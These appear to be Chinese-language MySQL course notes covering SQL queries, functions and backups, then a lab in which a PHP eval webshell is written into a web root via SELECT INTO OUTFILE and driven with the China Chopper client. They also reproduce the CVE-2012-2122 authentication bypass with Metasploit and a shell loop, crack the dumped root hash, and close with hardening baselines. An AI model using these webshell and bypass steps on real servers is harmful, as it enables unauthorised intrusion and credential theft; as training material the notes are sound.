INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (6, 1, 88);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (6, 2, 56);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (6, 4, 67);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (7, 2, 88);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (7, 3, 66);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (8, 1, 90);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (8, 2, 56);
INSERT INTO `score` (`sid`, `cid`, `score`) VALUES (8, 4, 67);
```

![image-20240718172856299](../../../../repo/assets/image-20240718172856299.png)

#####  (2)删除记录

> delete from 表名 where 要删除字段名=‘某值’;

例如：删除学号为11的学⽣信息

```
delete from stu where sid = 11;
```

![image-20240719093037893](../../../../repo/assets/image-20240719093037893.png)

#####  (3)更新记录

> update 表名 set 要更新字段名=‘某值’ where 唯⼀字段名=‘某值’;

 例如：将学号为5的学⽣名字改为rose

```
update stu set name='rose' where sid=5;
```

![image-20240719092820782](../../../../repo/assets/image-20240719092820782.png)

###  MySQL数据库查询实战操作

#### 1.常规查询

##### (1)基本查询语句

> 1. 查询所有姓名为张开头的学⽣
> 2. 查询年龄在25岁以上的学⽣
> 3. 查询家住北京和上海的学⽣
> 4. 没有留下邮箱的⼈
> 5. 有留下邮箱的⼈
> 6. 查询张三的信息
> 7. 查询sid为1号的学⽣信息
> 8. 查询邮箱为def的学⽣信息
> 9. 查询邮箱⾸字⺟为z或l的学⽣信息
> 10. 查询成绩，按照降序排列 默认是升序
> 11. 考第⼀名的学⽣成绩 limit 0,1 从位置0开始，取⼀个

```mysql
select * from stu where name like '张%';
select * from stu where age >= 25;
select * from stu where addr = '北京' or addr = '上海';
select * from stu where email = "";
select * from stu where email != '';
select * from stu where name = '张三';
select * from stu where sid = 1;
select * from stu where email like '%def%';
select * from stu where email like 'z%' or email like 'l%';
select * from score order by score desc;
select * from score order by score desc limit 0, 1;
```

![image-20240719103443950](../../../../repo/assets/image-20240719103443950.png)

MySQL使⽤limit排序分⻚查询数据顺序错乱的原因和解决⽅法

解决⽅案： 

①官⽹推荐在order by排序的列中增加⼀个索引列。 

②order by后多添加⼀个id字段排序。

```
select * from score order by cid,score desc limit 3, 1;
```

#####  (2)使⽤聚合函数查询

> 1. 总共多少学⽣
> 2. 求总分
> 3. 求平均分
> 4. 求最⾼分
> 5. 求最低分
> 6. 男⽣多少⼈，⼥⽣多少⼈
> 7. 男⽣⼈数
> 8.  
> 9. 每个学⽣的平均成绩
> 10. 求每⻔课程的平均成绩
> 11. 求学号为2的学⽣的平均成绩
> 12. 学⽣成绩分组显示⽅式GROUP_CONCAT() 
> 13. 
> 14. 每个⼈平均分，从⼤到⼩排

```mysql
select count(*) from stu;
select sum(score) from score;
select avg(score) from score;
select max(score) from score;
select min(score) from score;
select sex, count(sex) from stu group by sex;
select sex, count(sex) from stu group by sex having sex='m';
-- select sex, count(sex) from stu where sex='m';
select sid, avg(score) from score group by sid;
select cid, avg(score) from score group by cid;
select sid, avg(score) from score group by sid having sid = 2;
select sid, group_concat(cid), group_concat(score) from score group by sid;
-- select sid, group_concat(cid), group_concat(score order by score desc separator ' ') from score group by sid;
select sid, avg(score) as 'avg_score' from score group by sid order by avg_score desc;
```

![image-20240719110856116](../../../../repo/assets/image-20240719110856116.png)

#### 2.常⽤函数

##### (1)时间函数

| 函数           | ⽤法                              |
| -------------- | --------------------------------- |
| now()          | ⽇期时间，例如2024-03-07 14:39:16 |
| sysdate()      | 返回当前系统⽇期和时间            |
| curtime()      | 返回当前时间、只包含时、分、秒    |
| curdate()      | 返回当前⽇期，只包含年、⽉、⽇    |
| date(now())    | 返回⽇期，例如2013-08-09          |
| time(now())    | 返回时间，例如13:21:09            |
| year(now())    | 返回⽇期的年份                    |
| quarter(now()) | 返回⽇期对应的季度，范围为1～4    |
| month(now())   | 返回⽇期在⼀年中的第⼏个⽉        |
| week(now())    | 返回⽇期在⼀年中的第⼏个星期      |
| day(now())     | 返回天数                          |
| hour(now())    | 返回⼩时数                        |
| minute(now())  | 返回分钟数                        |
| second(now())  | 返回秒数                          |

```mysql
select now(); 			-- 2024-07-19 11:26:21
select sysdate();		-- 2024-07-19 11:26:40
select curtime();		-- 11:27:00
select curdate();		-- 2024-07-19

select date(now()); -- 2024-07-19
select time(now()); -- 11:30:22

select year(now());	-- 2024
select quarter(now()); -- 3
select month(now());	-- 7
select week(now()); -- 28
select day(now()); -- 19
select hour(now()); -- 11
select minute(now()); -- 31
select second(now()); -- 48
```

![image-20240719113336184](../../../../repo/assets/image-20240719113336184.png)

> -- 找出出⽣在1994年的学⽣信息
>
> -- 找出所有的00

```mysql
select * from stu where year(birth) =1994;
select * from stu where year(birth) >2000 or year(birth) = 2000;
```

![image-20240719113410361](../../../../repo/assets/image-20240719113410361.png)

#####  (2)字符串函数

| 函数                                       | ⽤法                                                         |
| ------------------------------------------ | ------------------------------------------------------------ |
| lower(column \| str)                       | 将字符串全部转换为⼩写字⺟                                   |
| upper(column \| str)                       | 将字符串全部转换为⼤写字⺟                                   |
| concat(column \| str1, column \| str2,...) | 将多个字符串⾸尾相连后返回                                   |
| concat_ws(separator, str1, str2, ... )     | 将多个字符串⽤指定连接符separator⾸尾相连后返回              |
| substr(str, pos[, len])                    | 从字符串中的指定位置pos开始取⼀个⻓度为len的字符串返回，pos 从1开始 |
| length(str)                                | 返回字符串的**存储⻓度**                                     |
| char_length(str)                           | 返回字符串的**字符个数**                                     |
| right(str, len)                            | 从str右边截取⻓度为len的字符                                 |
| left(str, len)                             | 从str左边截取⻓度为len的字符                                 |
| ORD(str)                                   | 显示ASCII码                                                  |
| mid(str, pos, len)                         | 将str从pos位置开始截取len个⻓度                              |
| sleep()                                    | 延时                                                         |

> 说明： 
>
> `substr`是在渗透测试中⽐较常⽤的 
>
> `char_length`是以**字符**为单位进⾏统计，
>
> `length`是以**字节**为单位，数字和英⽂标点都是1个字节，中⽂⼀个字是3字节
>
> `ORD`函数在爆库爆表时经常⽤到
>
> `mid`和`substr`⽤法相似，如果SQL注⼊的时候，⼀个被拦截了，可以⽤另外⼀个替换，SQL server和Oracle都⽀持 substr，mid只有mysql⽀持



```mysql
select lower("HELLOWORLD");
select upper("helloworld");
select concat("hello", "world");
select concat_ws("_", "a", "b","c" );
select substr("helloworld", 3, 4);
select length("张三");
select char_length("张三");
select right("helloworld", 3);
select left("helloworld", 3);
select ORD("a"); -- 97
select mid("helloworld", 3, 4);
select sleep(3);
```

![image-20240719144226613](../../../../repo/assets/image-20240719144226613.png)

> -- 将学⽣表中所有姓李的改成姓王的

```mysql
select sid, name, concat('王', right(name, char_length(name)-1)) from stu where name like '李%';
```

![image-20240719145219873](../../../../repo/assets/image-20240719145219873.png)

#### 3.union查询

union查询就是把2条或者多条sql语句的查询结果，合并成⼀个结果集。

`union`默认会**去除相同的⾏**，

如果**不去重**，使⽤`union all`。

```
SELECT sid, name, age FROM stu UNION SELECT * FROM score;
```

### MySQL数据库备份

#### 数据库备份的分类

##### （2）逻辑备份

###### a. 完全备份

每次对数据进⾏完整的备份； 

可以备份整个数据库，包含⽤户表、系统表、索引、视图和存储过程等所有数据库对象； 

但它需要花费更多的时间和空间，所以，做⼀次完全备份的周期要⻓些；

###### b. 差异备份

备份那些⾃从上次完全备份之后被修改过的数据，即只备份在全量备份之后数据库新增部分的内容； 

它⽐最初的完全备份⼩，因为只包含上次完全备份以后所有改变的数据； 

它的优点是存储和恢复速度较快；

###### c. 增量备份

只有那些在上次完全备份或者增量备份后被修改的数据才会被备份；

#### MySQL实现备份的两种⽅式

##### （1）⽂件备份

###### a. 使⽤`select into outfile`来进⾏**备份**

> select * from tablename into outfile '/tmp/abc.sql';

将表记录导出为**txt**⽂件。

```mysql
-- secure_file_priv设置为空，或者mysql有权限的固定⽬录
show VARIABLES like "secure_file_priv";

use tt;
select * from stu into outfile '/var/lib/mysql-files/stu_data.txt';
select * from score into outfile '/var/lib/mysql-files/score_data.txt';

system cat /var/lib/mysql-files/stu_data.txt
system cat /var/lib/mysql-files/score_data.txt
```

![image-20240719153805949](../../../../repo/assets/image-20240719153805949.png)

######  b. 使⽤`load data infile`进⾏⽂件**恢复**

> load data infile '/tmp/abc.sql' into table tablename;

```mysql
-- 要求导⼊的表结构与导出的表结构、字段类型⼀致
-- 不⽀持远程导⼊，只⽀持本地导⼊
use tt;
create table stu_temp(
 sid int(11) unsigned primary key auto_increment,
 name varchar(20) not null,
 sex enum('m', 'f') default 'm',
 age int,
 birth datetime not null default now(),
 addr varchar(50) default '北京',
 telephone varchar(11),
 email varchar(50)
);
 
select * from stu_temp;
desc stu_temp;

load data infile '/var/lib/mysql-files/stu_data.txt' into table stu_temp;
select * from stu_temp;
```

![image-20240719153956447](../../../../repo/assets/image-20240719153956447.png)

![image-20240719154324727](../../../../repo/assets/image-20240719154324727.png)

##### （2）mysqldump备份

> mysqldump –u root –p dbname >/tmp/dbname.sql
>
> mysqldump –u root –p dbname tablename >/tmp/tablename.sql

###### 1、备份数据表

```
mysqldump –u root –p123456 tt stu >/var/lib/mysql-files/stu.sql
```

```
cat /var/lib/mysql-files/stu.sql
```

![image-20240719155243918](../../../../repo/assets/image-20240719155243918.png)

###### 2、备份数据库

```
mysqldump –u root –p tt >/tmp/tt.sql
```

```
cat /tmp/tt.sql
```

![image-20240719154931149](../../../../repo/assets/image-20240719154931149.png)

###### 恢复数据

> mysql –u root –p dbname < /tmp/dbname.sql
>
> mysql> source /tmp/dbname.sql;

```bash
#使⽤mysql在shell命令⾏下恢复
mysql -uroot –p123456 tt</tmp/tt.sql

#登录mysql使⽤source进⾏恢复
mysql> use tt;
mysql> source /tmp/tt.sql;
```

![image-20240719160044991](../../../../repo/assets/image-20240719160044991.png)

![image-20240719160234439](../../../../repo/assets/image-20240719160234439.png)

#### 使⽤备份⽅式上传⼀句⽊⻢代码，获得webshell

##### (1)搭建靶机环境

> 先决条件： 
>
> 1.关闭`selinux`、关闭防⽕墙 
>
> 2.`secure_file_priv`设置为空 
>
> 3.知道⽹站的真实路径，⽐如`Apache`⽹站根⽬录`/var/www/html` 
>
> 4.MySQL对⽹站路径有写权限，`chown -R o+w /var/www` 
>
> 5.在MySQL配置⽂件`my.cnf`中设置`local-infile=1`

修改MySQL配置⽂件`/etc/my.cnf`，添加以下内容，并重启`mysqld`服务。

```bash
vim /etc/my.cnf

[mysqld]
secure_file_priv=
local-infile=1
 
[mysql]
local-infile=1

systemctl restart mysqld
```

安装`mysql-community-libs-compat-5.7.30-1.el7.x86_64.rpm`包，此包是安装MySQL时`rpm-bundle.tar` 包解压出来的，到解压⽬录寻找。

```
rpm -ivh mysql-community-libs-compat-5.7.30-1.el7.x86_64.rpm 
```

![image-20240719161551025](../../../../repo/assets/image-20240719161551025.png)

防⽕墙开启web 80端⼝和mysql 3306端⼝，并重启防⽕墙。

```
firewall-cmd --zone=public --add-port=3306/tcp --permanent
firewall-cmd --zone=public --add-port=80/tcp --permanent
systemctl restart firewalld
firewall-cmd --list-all
```

安装PHP 5

```
yum install php php-mysql -y
php -v
```

![image-20240719161654671](../../../../repo/assets/image-20240719161654671.png)

检查apache httpd是否安装，没有安装就需要安装。

```
rpm -qa | grep httpd*
yum -y install httpd*
```

修改httpd配置⽂件`/etc/httpd/conf/httpd.conf`，在`<IfModule mime_module>`代码块中添加如下内容， 并保存退出。

```
vim /etc/httpd/conf/httpd.conf

AddType application/x-httpd-php-source .phps
AddType application/x-httpd-php .php
```

![image-20240719162020674](../../../../repo/assets/image-20240719162020674.png)

到httpd⽹站根⽬录，新增⼀个`info.php`⽂件

```
cd /var/www/html/
echo "<?php phpinfo();?>" >/var/www/html/info.php
cat /var/www/html/info.php
```

![image-20240719162605619](../../../../repo/assets/image-20240719162605619.png)

修改`/var/www`⽬录权限，使mysql⽤户有写的权限。

```
chmod -R o+w /var/www
```

![image-20240719162518263](../../../../repo/assets/image-20240719162518263.png)

重启httpd服务，并检查运⾏状态。

```
systemctl restart httpd
ps -ef|grep httpd
netstat -ntlp |grep httpd
```

![image-20240719162900535](../../../../repo/assets/image-20240719162900535.png)

⽤其他计算机访问httpd服务所在主机

浏览器访问http://192.168.70.14/info.php，

![image-20240719162725961](../../../../repo/assets/image-20240719162725961.png)

##### (2)攻击

```mysql
use tt;
show tables;
create table temp(
    cmd text
);

insert into temp values(concat('<?php @eval($_POST[','''','muma','''',']); ?>'));
select * from temp;

select * from temp into outfile '/var/www/html/ma.php';
```

![image-20240719163805750](../../../../repo/assets/image-20240719163805750.png)

![image-20240719163956234](../../../../repo/assets/image-20240719163956234.png)

##### (3)使⽤菜⼑攻击PHP服务器

输⼊要攻击的PHP所在服务器地址 http://192.168.70.14/ma.php，后⾯输⼊密码`mimi`，点击添加

```
http://192.168.70.14/ma.php
muma
```

![image-20240719164313000](../../../../repo/assets/image-20240719164313000.png)

![image-20240719164342520](../../../../repo/assets/image-20240719164342520.png)

`ma.php`是在数据库攻击的时候，使⽤`select into outfile`命令将⽊⻢脚本存储到Apache的⽹站根⽬录⾥。

##### (4)wireshark抓取菜⼑流量

###### 筛选IP

```
ip.appr==192.168.70.14
```

###### 命令1

```
whoami
```

![image-20240722095527599](../../../../repo/assets/image-20240722095527599.png)

###### 右键追踪TCP流

![image-20240722095810089](../../../../repo/assets/image-20240722095810089.png)

###### 命令2

```
ls
```

![image-20240722101730780](../../../../repo/assets/image-20240722101730780.png)

```
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JG09Z2V0X21hZ2ljX3F1b3Rlc19ncGMoKTskcD0nL2Jpbi9zaCc7JHM9J2NkIC92YXIvd3d3L2h0bWwvO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXSc7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI%2FIi1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iOyRhcnJheT1hcnJheShhcnJheSgicGlwZSIsInIiKSxhcnJheSgicGlwZSIsInciKSxhcnJheSgicGlwZSIsInciKSk7JGZwPXByb2Nfb3Blbigkci4iIDI%2BJjEiLCRhcnJheSwkcGlwZXMpOyRyZXQ9c3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pO3Byb2NfY2xvc2UoJGZwKTtwcmludCAkcmV0OztlY2hvKCJYQFkiKTtkaWUoKTs%3D
```

###### url编码：

```
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JG09Z2V0X21hZ2ljX3F1b3Rlc19ncGMoKTskcD0nL2Jpbi9zaCc7JHM9J2NkIC92YXIvd3d3L2h0bWwvO2xzO2VjaG8gW1NdO3B3ZDtlY2hvIFtFXSc7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI/Ii1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iOyRhcnJheT1hcnJheShhcnJheSgicGlwZSIsInIiKSxhcnJheSgicGlwZSIsInciKSxhcnJheSgicGlwZSIsInciKSk7JGZwPXByb2Nfb3Blbigkci4iIDI+JjEiLCRhcnJheSwkcGlwZXMpOyRyZXQ9c3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pO3Byb2NfY2xvc2UoJGZwKTtwcmludCAkcmV0OztlY2hvKCJYQFkiKTtkaWUoKTs=
```

![image-20240722101802771](../../../../repo/assets/image-20240722101802771.png)

###### base64编码

```
@ini_set("display_errors","0");@set_time_limit(0);if(PHP_VERSION<'5.3.0'){@set_magic_quotes_runtime(0);};echo("X@Y");$m=get_magic_quotes_gpc();$p='/bin/sh';$s='cd /var/www/html/;ls;echo [S];pwd;echo [E]';$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";$r="{$p} {$c}";$array=array(array("pipe","r"),array("pipe","w"),array("pipe","w"));$fp=proc_open($r." 2>&1",$array,$pipes);$ret=stream_get_contents($pipes[1]);proc_close($fp);print $ret;;echo("X@Y");die();
```

![image-20240722101832127](../../../../repo/assets/image-20240722101832127.png)

###### 结论

1. 1.菜⼑发送的是POST请求
2. 2.菜⼑会伪造x-forwarded-for
3. 3.请求的路径是.php
4. 4.请求内容只有⼀个参数，这个参数的值是base64编码
5. 5.参数内容经过了base64_decode函数对z0进⾏base64编码
6. 6.base64编码内容进⾏解码后，得到都是⼀些PHP代码
7. 7.PHP代码都⽤分号分隔
8. 8.z0是⼀串PHP代码
9. 9.z1表示shell命令解释器
10. 10.z2表示执⾏的shell命令

###  MySQL身份验证绕过漏洞

`CVE 201202122`

#### 1.漏洞原理

当连接MariaDB/MySQL时，输⼊的密码会与期望的正确密码⽐较，由于不正确的处理，会导致即便是memcmp() 返回⼀个⾮零值，也会使MySQL认为两个密码是相同的。也就是说只要知道⽤户名，不断尝试就能够直接登⼊SQL 数据库。 我们可以使⽤Metasploit中的模块或者使⽤特殊的SQL语句进⾏身份绕过登录。

##### 影响版本：

###### MySQL 

- 5.1.x before 5.1.63
- 5.5.x before 5.5.24
- 5.6.x before 5.6.6

###### MariaDB 

- 5.1.x before 5.1.62
-  5.2.x before 5.2.12
-  5.3.x before 5.3.6
-  5.5.x before 5.5.23

`memcmp()`函数是C语⾔的⼀个函数，它的功能是对⽐两个参数，如果两个参数相同则返回0，如果第⼀个参数⼤于第⼆个参 数，则返回1，反之返回-1。

#### 2.漏洞复现 

#####  (1)Metasploit⼯具攻击  

Metasploit攻击前，需要搭建vulhub靶场。 

###### 更新docker-ce源

```
sudo yum install -y yum-utils device-mapper-persistent-data lvm2
sudo yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
sudo sed -i 's+download.docker.com+mirrors.aliyun.com/docker-ce+' /etc/yum.repos.d/docker-ce.repo
sudo yum makecache fast
sudo yum -y install docker-ce

systemctl start docker
systemctl enable docker
docker version
```

![image-20240722105746263](../../../../repo/assets/image-20240722105746263.png)

###### docker镜像

```bash
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": ["https://docker.fxxk.dedyn.io"]
}
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
```

###### 安装docker-compose

`1.29.2`

```bash
wget "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -O /usr/local/bin/docker-compose && chmod +x /usr/local/bin/docker-compose && docker-compose version
```

![image-20240722112432535](../../../../repo/assets/image-20240722112432535.png)

###### 下载vulhub

```
git clone https://github.com/vulhub/vulhub.git
```

###### 启动

```
cd vulhub/mysql/CVE-2012-2122
docker compose up -d
docker ps -s
```

![image-20240722114236227](../../../../repo/assets/image-20240722114236227.png)

###### Metasploit

```
msfconsole

use auxiliary/scanner/mysql/mysql_authbypass_hashdump
set RHOSTS 192.168.70.14
set THREADS 100
run
```

![image-20240722143351741](../../../../repo/assets/image-20240722143351741.png)

```
cat /root/.msf4/loot/20240722143306_default_192.168.70.14_mysql.hashes_604666.txt
```

![image-20240722143444513](../../../../repo/assets/image-20240722143444513.png)

```
"root","*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9"
```

###### md5

https://cmd5.com/

```
6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
```

![image-20240722143730040](../../../../repo/assets/image-20240722143730040.png)

> 密码：123456

这是⼀种攻击⽅式，它能够对密码表进⾏破解，然后就可以随意地登录到⽬标数据库了。

##### (2)shell命令攻击

```bash
for i in `seq 1 1000`; do mysql -u root -P3306  -password=bad -h 192.168.70.14 2>/dev/null;done
```

![image-20240722152259848](../../../../repo/assets/image-20240722152259848.png)

这种⽅式⽐较简单，直接⽤shell命令去攻击靶机，但是需要攻击机上安装mysql客户端，可以看到上⾯的攻击结 果，直接登录到靶机上的MySQL⾥⾯。

```
use mysql;
select Password from mysql.user where Password !="";
```

```
| *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
| *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9 |
```

![image-20240722152101953](../../../../repo/assets/image-20240722152101953.png)

### MySQL数据库的基线检查

#### 1.安全基线检查的基础知识

##### (1)安全基线的定义

  安全基线是⼀个信息系统的最⼩安全保证, 即该信息系统最基本需要满⾜的安全要求。信息系统安全往往需要在 安全付出成本与所能够承受的安全⻛险之间进⾏平衡, ⽽安全基线正是这个平衡的合理的分界线。不满⾜系统最基 本的安全需求, 也就⽆法承受由此带来的安全⻛险, ⽽⾮基本安全需求的满⾜同样会带来超额安全成本的付出, 所以 构造信息系统安全基线⼰经成为系统安全⼯程的⾸要步骤, 同时也是进⾏安全评估、解决信息系统安全性问题的先 决条件。 

##### (2)安全基线检查的内容

安全基线其实在信息系统需求分析的时候，就⼀定定好的。在软件开发过程中，安全已经进⼊到软件安全开发的⽣ 命周期⾥⾯，⼀般在需求阶段就要考虑好它的安全问题，也就是在需求阶段就定义好它的安全基线。 

信息系统的安全是⼀个⼤的基线检查框架，在这个框架中，安全基线检查的内容不是绝对的，它的检测内容可以分 为三部分：

1. ①系统存在的安全漏洞
2. ②系统配置的脆弱性 
3. ③系统状态的检测 

企业的信息系统是运⾏在⽹络之上的，有计算机系统、中间件、业务系统，每⼀个系统都有安全漏洞，每年有很多 国内的、国外的、⼯信部的各种漏洞库，这些安全漏洞可以简单分为三类： 

- 操作系统漏洞 
- 数据库漏洞 
- 应⽤系统漏洞 

信息系统所有的组成硬件、系统、软件等都有安全配置，例如操作系统配置，⽹络系统配置，安全设备配置等这些 配置都跟安全是息息相关的。这些都属于配置⽅⾯基线检查的内容。

##### (3)安全基线检查的操作

安全基线检查根据内容的不同，可以采取不同的操作⽅式，对于漏洞可以进⾏远程漏洞扫描，这种漏洞⼯具有各⼤ ⼚商提供的漏洞扫描⼯具，也有开源的⼯具，都可以做安全基线检查⼯具。⽤这些⼯具进⾏远程漏洞扫描，对企业 信息系统做⼀个基线检查，可以发现每个信息资产的配置参数是否安全。

漏洞扫描也可以在本地进⾏，本地检查可以采取⼿⼯⽅式，每个配置⽂件按照安全基线检查的操作要求去⽐对，还 可以⽤安全基线检查的⼯具盒，这种⼯具盒是⾃动化的去对配置⽂件读取，进⽽判定配置参数是否安全，这是本地 安全基线检查的操作⽅式。

#### 2.MySQL的安全基线检查

##### (1)版本加固

**安全基线项说明**∶满⾜业务正常运⾏的前提下，安装新版本，修补漏洞 

**检查⽅法** 

查看mysql版本信息∶

```
mysql> select version(); 
```

![image-20240722165058925](../../../../repo/assets/image-20240722165058925.png)

**加固⽅法**∶安装最新版mysql,https://www.mysql.com/

##### (2)弱⼝令

**安全基线项说明**∶确保数据库不存在弱⼝令，提⾼数据库安全性 

**检查⽅法**：将密码hash导⼊`cain`软件破解 

![image-20240722162414226](../../../../repo/assets/image-20240722162414226.png)

**加固⽅法**：

如要**`修改密码`**，执⾏如下命令

```
#⾸先以root⽤户登录
mysql> use mysql
mysql> update user set password=password（"复杂的新密码"） where user='test'；
mysql> flush privileges;
```

##### (3)不存在匿名账户 

安全基线项说明∶确保数据库不存在匿名账户，提⾼数据库安全性

**检查⽅法**∶检查匿名帐户是否存在

```
mysql> use mysql;
mysql> select user, authentication_string from mysql.user;
```

![image-20240722165224080](../../../../repo/assets/image-20240722165224080.png)

匿名账户是存在`user`和`authentication_string`字段均为**空**的⾏ 

**加固⽅法**∶ 

**删除匿名帐户**∶

```
mysql>use mysql;
mysql>delete from user where user="";
mysql>flush privileges;
```

#####  (4)合理设置权限

安全基线项说明∶合理设置⽤户权限，防⽌权限滥⽤ 

检查⽅法∶ 

- 查看⽤户权限∶

  ```
  show grants for test1@'%'; 
  ```

  ![image-20240722165352714](../../../../repo/assets/image-20240722165352714.png)

- 例如：

  ```
  mysql>show grants for root@'%'; 
  ```
  
  ![image-20240722165417785](../../../../repo/assets/image-20240722165417785.png)

加固⽅法∶⼀般应⽤⽤户建议授予**最⼩权限**。 

- ⽅法:grant 权限1,权限2,…,权限n on库名.表名 to ⽤户名@⽤户地址 

- 例如∶

  ```
  grant select,insert,delete on db.table to test@localhost;
  ```

#####  (5)合理设置⽂件权限  

  安全基线项说明∶合理设置数据库⽂件权限，防⽌⾮授权访问或篡改 

  检查⽅法∶确保重要的数据库⽂件没有任意可写权限或任意可读权限检查是否有不恰当的授权⽂件∶

```
#Is -al  .mysql_history .bash_history 应为600权限
#ls-al /etc/my.cnf 应为644权限
#find / -name *.MYD|xargs ls -al 应为600权限
#find / -name *.MYI|xargs ls -al 应为600权限
#find / -name *.frm|xargs ls -al  应为600权限
```

加固⽅法∶保护数据库⽂件，授予恰当的权限∶

```
#chmod 600 .mysql_history .bash_history 
#chmod 600 *.MYD *.MYI *.frm 
#chmod o-rw /etc/my.cnf
```

#####  (6)⽇志审核  

**安全基线项说明**∶合理设置⽇志审核，保证安全事件发⽣可查看⽇志记录 

**检查⽅法**∶查看`my.cnf`或`my.ini`⽂件，查看是否包含如下设置

```
show variables like '%log%' 
```

![image-20240723091139220](../../../../repo/assets/image-20240723091139220.png)

有效配置文件路径参数是log-bin, log-bin-index, log-error, general_log, slow_query_log等

```
vim /etc/my.cnf

[mysqld]
log = filename
```

**加固⽅法**∶在mysql的安装⽬录下，打开my.cnf或my.ini，在【mysqld】后⾯加上如下的参数，**取消注释并配 置⽇志⽂件**，保存后重启mysql服务。

```
touch /var/log/mysql-bin.log /var/log/mysql.log /var/log/mysql-update.log
vim /etc/my.cnf

log-error = /var/log/mysqld.log
```



```
ls /var/log/ |grep mysql
```

![image-20240722170951600](../../../../repo/assets/image-20240722170951600.png)

`slow-log`慢查询

#####  (7)运⾏账号  

**安全基线项⽬名称**∶Mysqld服务以普通⽤户运⾏，防⽌数据库⾼权限被利⽤ 

**检查⽅法**：检查进程属主和运⾏参数是否包含`--user=mysql` 类似语句∶

```
ps -ef|grep mysqld 
grep -i user /etc/my.cnf
```

**加固⽅法**：vi编辑/etc/my.cnf，设置如下∶

```
vim /etc/my.cnf

[mysql.server]
user=mysql
#重新启动mysqld服务
```



##### (8)可信IP地址控制 

**安全基线项说明**∶只允许**可信任的ip**访问数据库，降低数据库⻛险

**检查⽅法**∶查看可访问数据库的ip和ip对应的账号

```
mysql> select user,host from mysql.user;
```

![image-20240722171401578](../../../../repo/assets/image-20240722171401578.png)

**加固⽅法**

```
mysql> GRANT ALL PRIVILEGES ON *.* TO'可信任⽤户'@'可信任ip地址' IDENTIFIED BY '可信⽤户密码' WITH GRANT OPTION;
```

#####  (9)连接数限制 

**安全基线项说明**∶根据业务需求设置数据库**最⼤连接数**

**检查⽅法**∶查看MySQL配置⽂件∶my.cnf 或者是 my.ini

```
vim /etc/my.cnf

在【mysqld】选项查看最⼤连接数配置∶
max_connections =1000

查看当前最⼤连接数
mysql> show variables like 'max_connections';
```



![image-20240722171624139](../../../../repo/assets/image-20240722171624139.png)

**加固⽅法**∶

```
编辑MySQL配置⽂件∶my.cnf 或者是 my.ini 
在【mysqld】配置段添加∶
max_connections = 1000 
保存，重启MySQL服务。
```

###### 重启MySQL

```
systemctl restart mysqld
```



#### 3.MySQL更严格的⼀些基线要求 

##### (1)禁⽌远程连接数据库 

**安全基线项说明**：在命令⾏`netstat -ant`下看到，默认的3306端⼝是打开的，此时打开了mysqld的⽹络监听，允许⽤户远程通过帐号密码连接数本地据库，**默认情况是允许远程连接数据的**。

**检查⽅法**

```
show variables like "%skip_networking%";
show variables like "%bind_address%";
```

![image-20240723093605938](../../../../repo/assets/image-20240723093605938.png)

**加固⽅法**：

为了禁⽌该功能，启动`skip_networking`，**不监听sql的任何TCP/IP的连接，切断远程访问的权利**，保证安全性。

```
vim /etc/my.cnf

[mysqld]
bind_address=127.0.0.1
skip_networking=1
```

![image-20240723093718489](../../../../repo/assets/image-20240723093718489.png)

假如需要远程管理数据库，可通过安装`PhpMyadmin`来实现。

假如确实需要远程连接数据库，⾄少**修改默认的监听端⼝**，同时**添加防⽕墙规则**，只允许**可信任⽹络的mysql监听端⼝**的数据通过。

##### (2)改变默认mysql管理员账号 

安全基线项说明：系统mysql的管理员名称是`root`，⽽⼀般情况下，数据库管理员都没进⾏修改，这⼀定程度上对系统⽤户穷举的恶意⾏为提供了便利，此时**修改为复杂的⽤户名**，请不要再设定为admin或者administraror的形式，因为它们也在易猜的⽤户字典中。

加固⽅法：改成不易被猜到的⽤户名

```
mysql> update user set user="newroot" where mysql.user="root";
mysql> flush privileges;
```

![image-20240723100344748](../../../../repo/assets/image-20240723100344748.png)

#####  (3)删除默认测试库 

**安全基线项说明**：MySQL**有的**版本**初始化**后会⾃动⽣成空⽤户和test库，这会对数据库的安全构成威胁，**有必要全部删除**，最后的状态只保留单个root即可，当然以后根据需要增加⽤户和数据库。

**加固⽅法**：

```
mysql> show databases;
mysql> drop database test; -- 删除数据库test
```

